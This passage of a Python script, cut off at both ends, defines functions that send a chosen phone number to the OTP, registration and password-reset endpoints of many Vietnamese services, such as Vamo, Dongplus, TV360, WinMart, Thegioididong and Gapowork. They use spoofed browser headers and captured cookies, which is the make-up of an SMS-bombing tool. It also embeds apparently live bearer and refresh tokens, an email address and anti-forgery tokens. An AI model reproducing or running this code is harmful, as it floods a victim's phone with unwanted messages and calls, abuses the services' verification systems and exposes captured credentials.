    }

    response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)
def vamo_live(phone):
    url = "https://vamo.com.vn/ws/api/public/login-with-otp/generate-otp"
        
    payload = json.dumps({
        "username": phone[1:]
    })
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vamo.com.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vamo.com.vn/app/login",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Cookie": "_gid=GA1.3.415237584.1716200950; _gcl_au=1.1.1414429939.1716200951; _ga=GA1.1.2092855050.1716200950; _hjSessionUser_3571755=eyJpZCI6ImNlMGRlYjlkLThkY2EtNWU3YS1hZWRmLWY3MDU2Y2RmNTdhNiIsImNyZWF0ZWQiOjE3MTYyMDA5NTIwNDEsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3571755=eyJpZCI6Ijg1OTY2MDk5LWFlM2YtNDJlNC1hMzE4LWMzZjVkNWJmYmY5NyIsImMiOjE3MTYyMDA5NTIwNTEsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _ga_1HXSGSN1HG=GS1.1.1716200951.1.1.1716200962.49.0.0"
    }
        
    response = requests.post(url, data=payload, headers=headers)

def dongplus_live(phone):
	url = "https://api.dongplus.vn/api/user"
	url2 = "https://api.dongplus.vn/api/user/send-one-time-password"
		
	payload = json.dumps({
		"full_name": "Nguyễn Duy",
		"first_name": "Duy",
		"last_name": "Nguyễn",
		"mobile_phone": "84" + phone[1:],
		"target_url": "https://dongplus.vn/?utm_source=rubsala&utm_medium=affiliate&utm_campaign=cps&clickid=kiso1rdytvgp&gclid=1ec95a124c871b2190bb3c596786cb2e"
	})
	
	payload2 = json.dumps({
		"phone": "84" + phone[1:]
	})
	
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"ert": "DP:2e05ce4d68ff9bed3bf06e36bdca58a8",
		"accept-language": "vi",
		"sec-ch-ua-mobile": "?1",
		"rt": "2024-05-20T17:53:24+07:00",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://dongplus.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://dongplus.vn/user/registration/reg1",
		"Cookie": "_gid=GA1.2.873149977.1716202344; _gac_UA-214880719-1=1.1716202344.1ec95a124c871b2190bb3c596786cb2e; _clck=lgmnf%7C2%7Cflx%7C0%7C1601; _ga=GA1.2.725972664.1716202342; _ga_RRJDDZGPYG=GS1.1.1716202342.1.1.1716202391.11.0.0; _clsk=1pslc77%7C1716202391632%7C3%7C1%7Ck.clarity.ms%2Fcollect"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"ert": "DP:621cb7dac12c86a8c49b10c221346448",
		"accept-language": "vi",
		"sec-ch-ua-mobile": "?1",
		"rt": "2024-05-20T17:58:05+07:00",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://dongplus.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://dongplus.vn/user/login",
		"Cookie": "_gid=GA1.2.873149977.1716202344; _gac_UA-214880719-1=1.1716202344.1ec95a124c871b2190bb3c596786cb2e; _clck=lgmnf%7C2%7Cflx%7C0%7C1601; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1716202342.1.1.1716202678.57.0.0; _ga=GA1.2.725972664.1716202342; _clsk=1pslc77%7C1716202679716%7C6%7C1%7Ck.clarity.ms%2Fcollect"
	}
		
	response = requests.post(url, data=payload, headers=headers)
	
	if response.status_code == 422:
		response = requests.post(url2, data=payload2, headers=headers2)
def mpro_live(phone):
    url = "https://mproxy.vn/api/users/verify-call"

    payload = json.dumps({
        "phoneNumber": phone,
        "user": {
            "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTcwNzQsInJvbGVzIjpbXSwiaWF0IjoxNzE2MjA5NTU4LCJleHAiOjE3MTYyOTU5NTh9.kqDz1TKgho7p4oymu-7X-U5MvXXLos3_8uTRVII1GDg",
            "username": "Vexx",
            "email": "vrxxdev1337@gmail.com",
            "refresh_token": "PLSEnYt-pX-OBWFEnJZ9hZ2S0wh7dUZiSxqr9l4_Ilc",
            "status": 0,
            "amount": 0,
            "created_time": "2024-05-20T12:52:38.924Z",
            "invited_code": "Ahcdn",
            "register_from": "web",
            "mobile": None,
            "login_by": None,
            "avatar": None,
            "last_login_time": None,
            "roles": None,
            "promotion_code": None,
            "ban_expired": None,
            "id": 17074
        }
    })

    payload2 = json.dumps({
        "phoneNumber": phone,
        "resetPassRequest": True
    })
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTcwNzQsInJvbGVzIjpbXSwiaWF0IjoxNzE2MjA5NTU4LCJleHAiOjE3MTYyOTU5NTh9.kqDz1TKgho7p4oymu-7X-U5MvXXLos3_8uTRVII1GDg",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://mproxy.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://mproxy.vn/register/step-verify",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Cookie": "_gcl_au=1.1.830151818.1716209537; _ga=GA1.1.1259596620.1716209537; _fbp=fb.1.1716209540227.1844234366; auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTcwNzQsInJvbGVzIjpbXSwiaWF0IjoxNzE2MjA5NTU4LCJleHAiOjE3MTYyOTU5NTh9.kqDz1TKgho7p4oymu-7X-U5MvXXLos3_8uTRVII1GDg; _ga_7E6B8XN46L=GS1.1.1716209537.1.1.1716209562.35.0.1824886955"
    }

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTcwNzQsInJvbGVzIjpbXSwiaWF0IjoxNzE2MjA5NTU4LCJleHAiOjE3MTYyOTU5NTh9.kqDz1TKgho7p4oymu-7X-U5MvXXLos3_8uTRVII1GDg",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://mproxy.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://mproxy.vn/forgot-password",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Cookie": "_gcl_au=1.1.830151818.1716209537; _ga=GA1.1.1259596620.1716209537; _fbp=fb.1.1716209540227.1844234366; _ga_7E6B8XN46L=GS1.1.1716209537.1.1.1716210069.56.0.1824886955"
    }
        
    response = requests.post(url, data=payload, headers=headers)
def meta_live(phone):
	url = "https://meta.vn/app_scripts/pages/AccountReact.aspx"
		
	params = {
		"api_mode": "1"
	}
		
	payload = json.dumps({
		"api_args": {
			"lgUser": phone,
			"type": "phone"
		},
		"api_method": "CheckRegister"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://meta.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://meta.vn/account/register",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "_ssid=c1muvfvw3imwkridba5z1iem; __ckref=vn.search.yahoo.com; _cart_=a164d8ea-b3a4-46d4-81be-7e784d164fbc; __ckmid=27b3c25b63f6443fa7e46932a747a4ba; _gid=GA1.2.573277692.1716195354; _gat_UA-1035222-8=1; _gcl_au=1.1.1538606278.1716195355; _clck=o22beu%7C2%7Cflx%7C0%7C1601; _ga=GA1.1.167732050.1716195354; _clsk=1iddcxq%7C1716195369261%7C3%7C1%7Ck.clarity.ms%2Fcollect; _ga_L0FCVV58XQ=GS1.1.1716195356.1.1.1716195375.41.0.0; _ga_YE9QV6GZ0S=GS1.1.1716195358.1.1.1716195375.0.0.0"
	}
		
	response = requests.post(url, params=params, data=payload, headers=headers)
def tv361_live(phone):
	url = "https://m.tv360.vn/public/v1/auth/get-otp-login"

	payload = json.dumps({
		"msisdn": phone
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"starttime": "1716192643938",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"tz": "Asia/Saigon",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://m.tv360.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://m.tv360.vn/login?r=https%3A%2F%2Fm.tv360.vn%2F",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "device-id=s%3Awap_e9bcc49b-acbc-40ec-baa0-d8819ca996ac.KRe5vZopEZjHKGJR5pr192gHbpWVhg1GVp9OVdU%2BDoY; shared-device-id=wap_e9bcc49b-acbc-40ec-baa0-d8819ca996ac; G_ENABLED_IDPS=google; acw_tc=f73a875f560a2cdbdd41523ac002e421a3876e4ff48c98b7de0c58bf9569e739; img-ext=avif; _gid=GA1.2.967474692.1716192628; _gat_UA-180935206-1=1; _ga=GA1.1.851106672.1711887162; NEXT_LOCALE=vi; screen-size=s%3A400x845.RYhny3LbeCAOVLXReqUdgIrOClUnkew4bBP4sa2WExY; _ga_D7L53J0JMS=GS1.1.1716192627.5.1.1716192643.44.0.0; _ga_E5YP28Y8EF=GS1.1.1716192627.5.1.1716192643.0.0.0; session-id=s%3Ad105062b-9f92-438c-98cd-fb24e1e5b607.Y0bsmKawD3G4%2Bi%2BestuAlwQmGX8B4PqvB%2FYA1c1D5Js"
	}
	
	response = requests.post(url, data=payload, headers=headers)
def cellphones_live(phone):
	url = "https://api.cellphones.com.vn/v3/otp/phone/lost-password"
		
	payload = json.dumps({
		"phone": phone,
		"g-recaptcha-response": ""
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://account.cellphones.com.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def furing_live(phone):
	url = "http://funring.vn/api/v1.0.1/jersey/user/getotp"
		
	payload = json.dumps({
		"username": phone[1:],
		"captcha": "xdm5n"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate",
		"Content-Type": "application/json",
		"Origin": "http://funring.vn",
		"Referer": "http://funring.vn/module/register_mobile.jsp",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "JSESSIONID=NODE01oyzvf5gnafpcqs1hnlbej1vq7395794.NODE01; _ga=GA1.2.1809911727.1716194894; _gid=GA1.2.531014236.1716194894; _gat=1; _ga_3PYR5EWEF4=GS1.2.1716194895.1.1.1716194901.54.0.0"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def winmart_live(phone):
	url = "https://api-crownx.winmart.vn/iam/api/v1/user/register"
	url2 = "https://api-crownx.winmart.vn/iam/api/v1/user/forgot-pwd"
	
	payload = json.dumps({
		"firstName": "Lê Quốc Việt",
		"phoneNumber": phone,
		"masanReferralCode": "",
		"dobDate": "2001-01-01",
		"gender": "Male"
	})
	
	payload2 = json.dumps({
		"userName": phone
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "Bearer undefined",
		"x-api-merchant": "WCM",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://winmart.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://winmart.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "Bearer undefined",
		"x-api-merchant": "WCM",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://winmart.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://winmart.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers)
	
	if response.status_code == 200:
		return dict(status=response.status_code, content=response.text)
	else:
		response = requests.post(url2, data=payload2, headers=headers2)
def phuclong_live(phone):
	url = "https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd"

	payload = json.dumps({
		"userName": phone
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "Bearer undefined",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://order.phuclong.com.vn",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://order.phuclong.com.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def tgdd_live(phone):
    url = "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode"
        
    payload = f"phoneNumber={phone}&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8NJ72x-heHlJrMocXFWhvq5LaLeKX1im9gZ3UIVg2GTc1RZKcy_ZAROFwzfaNelLxmkAhi04g2biHZAMZDP80uyH-1cz8v1aWyYF6psupJg9svLnpyUXyRb-ANcnrQFS7EAS3gt5n9SJ3WpLtHcN0h4"
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://www.thegioididong.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.thegioididong.com/lich-su-mua-hang/dang-nhap",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Cookie": "TBMCookie_3209819802479625248=509214001716196355+oObf9IUcAgZFKMKYnBM0Vc5jcY=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dtrue,navigator.platform%3DLinux%20armv81,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20plugins,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D\"C\"%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.306734706.1716196357; _pk_id.7.8f7e=2b59613fc11dddea.1716196359.; _pk_ses.7.8f7e=1; _gid=GA1.2.1724060747.1716196359; _fbp=fb.1.1716196359465.205654797; _gat=1; DMX_Personal=%7B%22UID%22%3A%221aa4a79b1e0ff0c26111c114cd7f9f5a5c4f1659%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8NJ72x-heHlJrMocXFWhvq6Av6y0WwbCdMmkwwpIvAT96-8oSNEYEu7yggtJFFfs2T38s0xF8D1oaYOQRIVokRH1A57AebdrJui2jvSciSyaNVC98oj0hPj0clzGe3QIIWjTk_qOox7Y_df1aoHd8W4; _ga=GA1.2.2117236983.1716196357; _ga_TZK5WPYMMS=GS1.2.1716196363.1.0.1716196363.60.0.0; _ga_TLRZMSX5ME=GS1.1.1716196357.1.1.1716196364.53.0.0; SvID=beline2683|ZksUE|ZksUB; _ce.irv=new; cebs=1; _tt_enable_cookie=1; _ttp=HneT0_H99UCMT875YioST8zLYpU; _ce.clock_event=1; __zi=2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvBBNJ5AUSvFcjzG8KfnnsUQvqmrLap8oC0.1; _ce.clock_data=-605%2C116.105.221.247%2C2%2C72b9292105a9e001ee6314573aecd272%2CChrome%2CVN; cebsp_=1; _ce.s=v~e4b1bff0ef1730dd55d8bdb1903a65afe5559b09~lcw~1716196368094~lva~1716196364758~vpv~0~v11.cs~127806~v11.s~1ef07360-1689-11ef-b1e1-f7b4db411670~v11.sla~1716196368099~lcw~1716196368100"
    }
        
    response = requests.post(url, data=payload, headers=headers)
def gapo_live(phone):
    url = "https://api.gapowork.vn/auth/v3.1/check-phone-number"
    url2 = "https://api.gapowork.vn/auth/v3.1/signup"
    url3 = "https://api.gapowork.vn/auth/v3.1/forgot-password"

    payload = json.dumps({
        "phone_number": phone
    })

    payload2 = json.dumps({
        "phone_number": phone,
        "device_id": "9434ec2e-61e7-4b48-913b-ec9eaf31220b",
        "device_model": "web"
    })
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "x-gapo-lang": "vi",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://www.gapowork.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.gapowork.vn/",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "x-gapo-lang": "vi",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://www.gapowork.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.gapowork.vn/",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
        
    response = requests.post(url, data=payload, headers=headers)

    if response.status_code == 404:
        response = requests.post(url2, data=payload2, headers=headers2)
        
    elif response.status_code == 200:
        response = requests.post(url3, data=payload2, headers=headers2)
def vietlot_live(phone):
	url = "https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber"
	
	payload = json.dumps({
		"phoneNumber": phone
	})
	
	headers = {
		"Host": "api-mobi.vietlottsms.vn",
		"Connection": "keep-alive",
		"Content-Length": "28",
		"ClientCallAPI": "EMB",
		"deviceId": "",
		"sec-ch-ua-mobile": "?1",
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/json",
		"Accept": "/",
		"partnerChannel": "WEB",
		"Identify-Device-Token": "",
		"checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://vietlott-sms.vn",
		"Sec-Fetch-Site": "cross-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://vietlott-sms.vn/",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
	}
		
	response = requests.post(url, headers=headers, data=payload)
def tts1_live(phone):
    url = "https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone"
    url2 = "https://m.thitruongsi.com/endpoint/v1/user/api/v3/me/forgot-password/sms"

    payload = json.dumps({
        "account_phone": phone,
        "recaptcha_token": "03AFcWeA5vS0CFFE5hYHcUMPbH-A7iJNJK5bSbmjjPJu8wYb_H-Um5T-JNSZhGS1Sl0l6C7XjXyZa9snPCOKrGez3t-zsbDxKC77CgP1-f1Q_QP-8NQ9eaVzMfvSDTMqgObIqqqruJ3y-hJ2cqXT8rvVGOu8dG1c95g5yaP7kcj6FrDu4kFuVcTZ3c5VUw4XTasWtdpqlVslhC_ZMikYRzL1lrRApKBrWXLXsXV0mdzmlPsqFlCxSpam4VSjsxTzK94z8zL6yvPaUm6ETmfglnt2lD2RN5wLAgF_gZ5SNjKyqvyEc46Cl_QLbmcadhpamBDRiPm0IEQODKf2qFfZLjdTgEtXEvenhxUELQ0FIHvn3nDjvgRv0twJsibLdt7M9zk6GDW4Zt8cNMi3GaZrVwTIT1fh1RsrsaLLF2LEHHESyFlLI5A53Q8DoBu5jy6J0VGORhoeaNF08Da-Q8jVtfUzLXXQcKOJP6DEOHANOKfUwEMKoEgvX1S4zeZcDigkrpJF4VL2oaohsf4nylWmzqwkme9dkTgSWCkhdIgBgZ6f1L7TpWtpx96m1PFYbo0XXLuFN11jObjphqdm_vR_2dK0MwIhf4r_6M4-Obj2NMbkYz8UI-SmtfDFzUn8_TTae28y8bAWLqQZuR-puxF0Xpx1oRdBGQ_wIfRYgOuq8gciM8dhNgT10anXg-BW8QhB5oDflrZ6pgw2IiTOUPozn5m1nWhMcD3ofom8CCQX8GpHzb0OSYSo374bXsQHA6DXShcOhp0enMDyq3saqqIXY5MTHC0iM3AtDQ-Iq6w9fkiuXbiMYfr5eB7_3waa_XTWXngl7StJ3LsMScuNyco3JJ5bpKCHdm3Dm5MNXMQes-JprJ7kuoJHPZU2wfDgP-shS2KwLSSgtZg-Q6QNgCiVYHKSkIzFrdZtb7ZxcT6Z_PJglCVD2VSrAu6i6mlC-vAHxojdJ9dM0xVtUTpvkyNQICpj6lIFvsPSDKg0ZqgO5wU_ZvIHSs7qlTGYQ9IvTsrirdJC2LpBqi5CKNb3eDTtdyg4FGANWtvM4ujXx0oIHA5FBrteZngeAq8A0tXOVN5Abxmz_2wB6KjFgQB7FH40LXTzbs_kWfznXt7OIcg6Wr4H-jLoJlGo-dQhaF0x4xZ_t6SqPF-7tN7yqQknWDvpdEpgimFi0oqipTzLsfD4DOZRtqsZDVZ_hD8pLGz-eclbUNnbuE0G008J6Jk82JY5MW7OznhpJTLClD2fP2L1U7DgWlajzpxWZX8dRbVybZg6iyf4iQjvGlnD3uX9Mtdnq6YnW2qUXFmLNhMd_ZmtLYwPFvCe9zkYoaZr_UYNKq8eT6wU5m7sSxkEBziJyipIHll1L4-OW1vO0wBtqRYR1UnlJ8_f3VEw932e_PXxn91pXA11qcqT7qtp_7YusO8MsdLtHXwYzURxo0wayd-L9SMxPyTtsl0nI00w25MGVilYXOcGw-ppbmAz4jMOW5P6hE2-NFMHxYyEc7UJf2FYr7TfursbKPCBzFIe6C7ky2WGbvIRnc2OvaWyRx3Xr0WzScZm_oLn90qtjhBDQ5RyTlk1NEdmj2H9PJI39nRd25bVBjR82zaBMr4qX2lHpCqBEjSVL8iXAbcRSuDfGGPdIOPwP9ObM1qDokGN12XDkWE9ceN3wBh4vvLKZeCMv2-e3FvH2DsfOjPKdC4JVD4bOJUyxdOzkvlB7M3LSUECJX3rIxaYJVSxm9b0-va0sSvrF1m0L0t3qmEx3Z6aS5gkj0kBiLNDrczxyVnTD63-R650z8G_n_m4tAnmDAOSkf-UY0Mg4ZI3cwFc702DvBkq8Z8PHQKs0S0qv0q44uLHRW-u9V-zm_dq2w0ijeA2pY72WprA6MOPFe-7-bwXPBdOpHdTJevEmaV5uqgC66krVJJ_8CG6qstbCoGT5f0CtRs-nw1-0I3_9clhC0fXDLtezJDoNkJXUxySPN3M